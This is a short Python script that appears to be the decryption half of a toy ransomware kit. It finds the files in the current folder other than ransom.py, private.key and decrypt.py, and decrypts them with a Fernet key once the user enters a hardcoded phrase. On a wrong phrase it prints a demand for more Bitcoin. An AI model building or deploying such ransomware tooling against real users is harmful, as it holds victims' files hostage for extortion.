#!/usr/bin/python3 

import os 
from cryptography.fernet import Fernet 

list_of_file=[]

for file in os.listdir():
	if os.path.isfile(file):
		if file != "ransom.py" and file !="private.key" and file != "decrypt.py":
			list_of_file.append(file)

#Accessing the private key to decrypt the files

keyfile= open("private.key","rb").read()

secret_phrase= "securepassword"

user_phrase= input("Enter the secret phrase to unlock your file:\t")

#decrypting the files

if user_phrase == secret_phrase:
    for file in list_of_file:
        with open(file, "rb") as opencontent:
            encrypted_data = opencontent.read()
            decrypted_content = Fernet(keyfile).decrypt(encrypted_data)
        with open(file, "wb") as openfile:
            openfile.write(decrypted_content)
else:
	print("wrong password sorry you will have to buy me more BTC")





